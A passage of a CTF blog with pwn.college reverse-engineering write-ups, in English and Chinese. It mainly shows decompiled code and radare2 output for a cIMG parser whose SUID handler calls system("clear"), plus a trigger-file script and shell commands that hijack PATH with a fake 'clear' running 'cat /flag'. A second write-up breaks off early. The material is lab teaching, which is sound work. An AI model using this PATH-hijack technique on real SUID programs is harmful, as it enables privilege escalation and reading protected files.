-      <meta itemprop="description" content="A blog about CTF writeups, Linux, Mathematics, Technology, and personal thoughts.">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content=" | Hello Navi">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/wp/PwnCollege/PwnCollege-re-unsafe-animations/" class="post-title-link" itemprop="url">PwnCollege - RE - Unsafe Animations</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">Posted on</span>
-      
-
-      <time title="Created: 2026-03-18 15:27:33 / Modified: 15:45:40" itemprop="dateCreated datePublished" datetime="2026-03-18T15:27:33+08:00">2026-03-18</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">In</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
-        </span>
-    </span>
-
-  
-  
-  <span class="post-meta-item">
-    
-      <span class="post-meta-item-icon">
-        <i class="far fa-comment"></i>
-      </span>
-      <span class="post-meta-item-text">Disqus: </span>
-    
-    <a title="disqus" href="/wp/PwnCollege/PwnCollege-re-unsafe-animations/#disqus_thread" itemprop="discussionUrl">
-      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="wp/PwnCollege/PwnCollege-re-unsafe-animations/" itemprop="commentCount"></span>
-    </a>
-  </span>
-  
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <blockquote>
-<p>The extensibility of our cIMG directives list continues to amaze!</p>
-</blockquote>
-<blockquote>
-<p>HINT: Keep the “Pondering PATH” level of Linux Luminarium in mind. It
-will be useful.</p>
-</blockquote>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv, <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">cimg</span> <span class="title">cimg</span> =</span> &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    cimg.framebuffer = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="type">int</span> won = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (argc &gt; <span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">strcmp</span>(argv[<span class="number">1</span>]+<span class="built_in">strlen</span>(argv[<span class="number">1</span>])<span class="number">-5</span>, <span class="string">&quot;.cimg&quot;</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;ERROR: Invalid file extension!&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        dup2(open(argv[<span class="number">1</span>], O_RDONLY), <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    read_exact(<span class="number">0</span>, &amp;cimg.header, <span class="keyword">sizeof</span>(cimg.header), <span class="string">&quot;ERROR: Failed to read header!&quot;</span>, <span class="number">-1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (cimg.header.magic_number[<span class="number">0</span>] != <span class="string">&#x27;c&#x27;</span> || cimg.header.magic_number[<span class="number">1</span>] != <span class="string">&#x27;I&#x27;</span> || cimg.header.magic_number[<span class="number">2</span>] != <span class="string">&#x27;M&#x27;</span> || cimg.header.magic_number[<span class="number">3</span>] != <span class="string">&#x27;G&#x27;</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;ERROR: Invalid magic number!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (cimg.header.version != <span class="number">4</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;ERROR: Unsupported version!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    initialize_framebuffer(&amp;cimg);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (cimg.header.remaining_directives--)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">uint16_t</span> directive_code;</span><br><span class="line">        read_exact(<span class="number">0</span>, &amp;directive_code, <span class="keyword">sizeof</span>(directive_code), <span class="string">&quot;ERROR: Failed to read &amp;directive_code!&quot;</span>, <span class="number">-1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">switch</span> (directive_code)</span><br><span class="line">        &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            handle_1(&amp;cimg);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            handle_2(&amp;cimg);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">            handle_3(&amp;cimg);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">            handle_4(&amp;cimg);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">            handle_5(&amp;cimg);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">            handle_6(&amp;cimg);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">            handle_7(&amp;cimg);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;ERROR: invalid directive_code %ux\n&quot;</span>, directive_code);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    display(&amp;cimg, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>r2 -A -q -c “pdf @ sym.handle_6; pdf @ sym.handle_7”
-/challenge/cimg</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">            ; CALL XREF from main @ 0x40147d(x)</span><br><span class="line">┌ 119: sym.handle_6 (int64_t arg1, int64_t arg5);</span><br><span class="line">│ `- args(rdi, r8) vars(2:sp[0x10..0x11])</span><br><span class="line">│           0x00401fbb      f30f1efa       endbr64</span><br><span class="line">│           0x00401fbf      55             push rbp</span><br><span class="line">│           0x00401fc0      4183c8ff       or r8d, 0xffffffff          ; -1 ; arg5</span><br><span class="line">│           0x00401fc4      ba01000000     mov edx, 1                  ; int64_t arg3</span><br><span class="line">│           0x00401fc9      4889fd         mov rbp, rdi                ; arg1</span><br><span class="line">│           0x00401fcc      488d0d8712..   lea rcx, str.ERROR:_Failed_to_read_clear_ ; 0x40325a ; &quot;ERROR: Failed to read &amp;clear!&quot; ; int64_t arg4</span><br><span class="line">│           0x00401fd3      31ff           xor edi, edi                ; int fildes</span><br><span class="line">│           0x00401fd5      4883ec10       sub rsp, 0x10</span><br><span class="line">│           0x00401fd9      64488b0425..   mov rax, qword fs:[0x28]</span><br><span class="line">│           0x00401fe2      4889442408     mov qword [canary], rax</span><br><span class="line">│           0x00401fe7      31c0           xor eax, eax</span><br><span class="line">│           0x00401fe9      488d742407     lea rsi, [var_7h]           ; void *buf</span><br><span class="line">│           0x00401fee      e8d3f5ffff     call sym.read_exact</span><br><span class="line">│           0x00401ff3      e838f2ffff     call sym.imp.geteuid        ; uid_t geteuid(void)</span><br><span class="line">│           0x00401ff8      89c7           mov edi, eax                ; int uid</span><br><span class="line">│           0x00401ffa      e8e1f2ffff     call sym.imp.setuid         ; int setuid(int uid)</span><br><span class="line">│           0x00401fff      488d3d7212..   lea rdi, str.clear          ; 0x403278 ; &quot;clear&quot; ; const char *string</span><br><span class="line">; !!!</span><br><span class="line">│           0x00402006      e8e5f1ffff     call sym.imp.system         ; int system(const char *string)</span><br><span class="line">; !!!</span><br><span class="line">│           0x0040200b      31f6           xor esi, esi</span><br><span class="line">│           0x0040200d      31c0           xor eax, eax</span><br><span class="line">│           0x0040200f      4889ef         mov rdi, rbp                ; int64_t arg1</span><br><span class="line">│           0x00402012      e843ffffff     call sym.display</span><br><span class="line">│           0x00402017      488b442408     mov rax, qword [canary]</span><br><span class="line">│           0x0040201c      6448330425..   xor rax, qword fs:[0x28]</span><br><span class="line">│       ┌─&lt; 0x00402025      7405           je 0x40202c</span><br><span class="line">│       │   0x00402027      e8b4f1ffff     call sym.imp.__stack_chk_fail ; void __stack_chk_fail(void)</span><br><span class="line">│       │   ; CODE XREF from sym.handle_6 @ 0x402025(x)</span><br><span class="line">│       └─&gt; 0x0040202c      4883c410       add rsp, 0x10</span><br><span class="line">│           0x00402030      5d             pop rbp</span><br><span class="line">└           0x00402031      c3             ret</span><br><span class="line">            ; CALL XREF from main @ 0x401484(x)</span><br><span class="line">┌ 121: sym.handle_7 (int64_t arg5);</span><br><span class="line">│ `- args(r8) vars(4:sp[0x10..0x24])</span><br><span class="line">│           0x00401ee1      f30f1efa       endbr64</span><br><span class="line">│           0x00401ee5      4883ec28       sub rsp, 0x28</span><br><span class="line">│           0x00401ee9      4183c8ff       or r8d, 0xffffffff          ; -1 ; arg5</span><br><span class="line">│           0x00401eed      31ff           xor edi, edi                ; int fildes</span><br><span class="line">│           0x00401eef      ba04000000     mov edx, 4                  ; size_t nbyte</span><br><span class="line">│           0x00401ef4      64488b0425..   mov rax, qword fs:[0x28]</span><br><span class="line">│           0x00401efd      4889442418     mov qword [canary], rax</span><br><span class="line">│           0x00401f02      31c0           xor eax, eax</span><br><span class="line">│           0x00401f04      488d742404     lea rsi, [var_4h]           ; void *buf</span><br><span class="line">│           0x00401f09      488d0d0c13..   lea rcx, str.ERROR:_Failed_to_read_milliseconds_ ; 0x40321c ; &quot;ERROR: Failed to read &amp;milliseconds!&quot; ; int64_t arg4</span><br><span class="line">│           0x00401f10      e8b1f6ffff     call sym.read_exact</span><br><span class="line">│           0x00401f15      8b442404       mov eax, dword [var_4h]</span><br><span class="line">│           0x00401f19      b9e8030000     mov ecx, 0x3e8              ; 1000</span><br><span class="line">│           0x00401f1e      31d2           xor edx, edx</span><br><span class="line">│           0x00401f20      31f6           xor esi, esi                ; struct timespec *rem</span><br><span class="line">│           0x00401f22      488d7c2408     lea rdi, [req]              ; const struct timespec *req</span><br><span class="line">│           0x00401f27      f7f1           div ecx</span><br><span class="line">│           0x00401f29      89c0           mov eax, eax</span><br><span class="line">│           0x00401f2b      4889442408     mov qword [req], rax</span><br><span class="line">│           0x00401f30      69c240420f00   imul eax, edx, 0xf4240</span><br><span class="line">│           0x00401f36      4889442410     mov qword [var_10h], rax</span><br><span class="line">│           0x00401f3b      e8d0f2ffff     call sym.imp.nanosleep      ; int nanosleep(const struct timespec *req, struct timespec *rem)</span><br><span class="line">│           0x00401f40      488b442418     mov rax, qword [canary]</span><br><span class="line">│           0x00401f45      6448330425..   xor rax, qword fs:[0x28]</span><br><span class="line">│       ┌─&lt; 0x00401f4e      7405           je 0x401f55</span><br><span class="line">│       │   0x00401f50      e88bf2ffff     call sym.imp.__stack_chk_fail ; void __stack_chk_fail(void)</span><br><span class="line">│       │   ; CODE XREF from sym.handle_7 @ 0x401f4e(x)</span><br><span class="line">│       └─&gt; 0x00401f55      4883c428       add rsp, 0x28</span><br><span class="line">└           0x00401f59      c3             ret</span><br></pre></td></tr></table></figure>
-<p>in <code>handle_6</code></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0x00401ff3      call sym.imp.geteuid        ; 获取有效用户 ID (通常是拥有 SUID 的 root 或 flag 账户)</span><br><span class="line">0x00401ffa      call sym.imp.setuid         ; 将实际用户 ID 设为有效用户 ID</span><br><span class="line">0x00401fff      lea rdi, str.clear          ; 准备字符串 &quot;clear&quot;</span><br><span class="line">0x00402006      call sym.imp.system         ; 执行！</span><br></pre></td></tr></table></figure>
-<p><code>handle_6</code> 里为动画清屏功能直接调用了
-<code>system("clear")</code> with <code>geteuid()</code> &amp;
-<code>setuid()</code></p>
-<p>如果需要清屏应该向终端发送 ANSI 转义序列（如
-<code>\x1b[2J\x1b[H</code>）</p>
-<p>&amp; 提示了 “Pondering PATH”，使用路径替换。</p>
-<p>&amp; <code>system("clear")</code> 并没有指定
-<code>/usr/bin/clear</code>。Linux 就会去环境变量 <code>$PATH</code>
-里从左到右依次搜索名为 <code>clear</code> 的可执行文件。</p>
-<p>需要一个合法的 Version 4 Header，加上一个触发 <code>handle_6</code>
-的指令。</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line"><span class="comment"># Header: &quot;cIMG&quot;, version 4, width 1, height 1, 1 directive</span></span><br><span class="line">payload = struct.pack(<span class="string">&quot;&lt;4sHBBI&quot;</span>, <span class="string">b&quot;cIMG&quot;</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Directive 6 (handle_6): opcode 6, 占位符参数 0</span></span><br><span class="line">payload += struct.pack(<span class="string">&quot;&lt;HB&quot;</span>, <span class="number">6</span>, <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;trigger.cimg&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(payload)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] Trigger generated: trigger.cimg&quot;</span>)</span><br></pre></td></tr></table></figure>
-<p>PATH 替换</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">hacker@reverse-engineering~unsafe-animations:~$ <span class="built_in">mkdir</span> -p /tmp/arch_way</span><br><span class="line">hacker@reverse-engineering~unsafe-animations:~$ <span class="built_in">echo</span> <span class="string">&#x27;#!/bin/sh&#x27;</span> &gt; /tmp/arch_way/clear</span><br><span class="line">hacker@reverse-engineering~unsafe-animations:~$ <span class="built_in">echo</span> <span class="string">&#x27;cat /flag&#x27;</span> &gt;&gt; /tmp/arch_way/clear</span><br><span class="line">hacker@reverse-engineering~unsafe-animations:~$ <span class="built_in">chmod</span> +x /tmp/arch_way/clear</span><br><span class="line">hacker@reverse-engineering~unsafe-animations:~$ <span class="built_in">export</span> PATH=/tmp/arch_way:<span class="variable">$PATH</span></span><br><span class="line">hacker@reverse-engineering~unsafe-animations:~$ <span class="built_in">which</span> clear</span><br><span class="line">/tmp/arch_way/clear</span><br><span class="line">hacker@reverse-engineering~unsafe-animations:~$ /challenge/cimg trigger.cimg</span><br><span class="line">^C</span><br><span class="line">hacker@reverse-engineering~unsafe-animations:~$ python tmp.py</span><br><span class="line">[+] Trigger generated: trigger.cimg</span><br><span class="line">hacker@reverse-engineering~unsafe-animations:~$ /challenge/cimg trigger.cimg</span><br><span class="line">pwn.college&#123;**********************************************&#125;</span><br></pre></td></tr></table></figure>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="https://vkkkv.github.io/wp/PwnCollege/PwnCollege-re-accessing-resources/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.png">
-      <meta itemprop="name" content="vkkkv">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hello Navi">
-      <meta itemprop="description" content="A blog about CTF writeups, Linux, Mathematics, Technology, and personal thoughts.">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content=" | Hello Navi">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/wp/PwnCollege/PwnCollege-re-accessing-resources/" class="post-title-link" itemprop="url">PwnCollege - RE - Accessing Resources</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">Posted on</span>
-      
-
-      <time title="Created: 2026-03-18 15:27:25 / Modified: 15:27:26" itemprop="dateCreated datePublished" datetime="2026-03-18T15:27:25+08:00">2026-03-18</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">In</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
-        </span>
-    </span>
-
-  
-  
-  <span class="post-meta-item">
-    
-      <span class="post-meta-item-icon">
-        <i class="far fa-comment"></i>
-      </span>
-      <span class="post-meta-item-text">Disqus: </span>
-    
-    <a title="disqus" href="/wp/PwnCollege/PwnCollege-re-accessing-resources/#disqus_thread" itemprop="discussionUrl">
-      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="wp/PwnCollege/PwnCollege-re-accessing-resources/" itemprop="commentCount"></span>
-    </a>
-  </span>
-  
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <blockquote>
-<p>Often times, as feature bloat makes a software project more and more
-complicated, vulnerabilities slip in due to the interaction of too many
-moving parts. In the course of reverse engineering the software, reverse
-engineers will often spot such vulnerabilities.</p>
-</blockquote>
-<blockquote>
-<p>This is one such scenario. Find and use the vulnerability in
-/challenge/cimg to get the flag!</p>
-</blockquote>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv, <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">cimg</span> <span class="title">cimg</span> =</span> &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    cimg.framebuffer = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="type">int</span> won = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (argc &gt; <span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">strcmp</span>(argv[<span class="number">1</span>]+<span class="built_in">strlen</span>(argv[<span class="number">1</span>])<span class="number">-5</span>, <span class="string">&quot;.cimg&quot;</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;ERROR: Invalid file extension!&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        dup2(open(argv[<span class="number">1</span>], O_RDONLY), <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    read_exact(<span class="number">0</span>, &amp;cimg.header, <span class="keyword">sizeof</span>(cimg.header), <span class="string">&quot;ERROR: Failed to read header!&quot;</span>, <span class="number">-1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (cimg.header.magic_number[<span class="number">0</span>] != <span class="string">&#x27;c&#x27;</span> || cimg.header.magic_number[<span class="number">1</span>] != <span class="string">&#x27;I&#x27;</span> || cimg.header.magic_number[<span class="number">2</span>] != <span class="string">&#x27;M&#x27;</span> || cimg.header.magic_number[<span class="number">3</span>] != <span class="string">&#x27;G&#x27;</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;ERROR: Invalid magic number!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (cimg.header.version != <span class="number">4</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;ERROR: Unsupported version!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    initialize_framebuffer(&amp;cimg);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (cimg.header.remaining_directives--)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">uint16_t</span> directive_code;</span><br><span class="line">        read_exact(<span class="number">0</span>, &amp;directive_code, <span class="keyword">sizeof</span>(directive_code), <span class="string">&quot;ERROR: Failed to read &amp;directive_code!&quot;</span>, <span class="number">-1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">switch</span> (directive_code)</span><br><span class="line">        &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            handle_1(&amp;cimg);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            handle_2(&amp;cimg);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">            handle_3(&amp;cimg);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">            handle_4(&amp;cimg);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">            handle_5(&amp;cimg);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;ERROR: invalid directive_code %ux\n&quot;</span>, directive_code);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    display(&amp;cimg, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>r2 -A -q -c “pdf @ sym.handle_5” /challenge/cimg</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span 